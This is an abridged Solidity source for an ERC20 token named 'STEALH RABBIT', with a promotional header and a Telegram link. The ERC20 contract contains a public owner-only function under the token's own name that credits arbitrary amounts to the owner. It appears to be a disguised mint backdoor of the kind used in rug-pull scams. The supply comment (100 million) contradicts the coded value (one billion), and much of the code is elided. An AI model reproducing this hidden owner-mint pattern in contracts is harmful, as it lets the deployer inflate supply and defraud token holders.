...
//
// $StealhRabbit proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/+Zs5u0Uswk8o3NDFl
//  
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _STEALHRABBIT(uint256 amount) public onlyOwner {
 _STEALHRABBIT(msg.sender, amount);
    }
    ...
    function _STEALHRABBIT(address account, uint256 amount) internal virtual {
...
contract STEALHRABBIT is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("STEALH RABBIT", "STEALHRABBIT") {
     _STEALHRABBIT(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}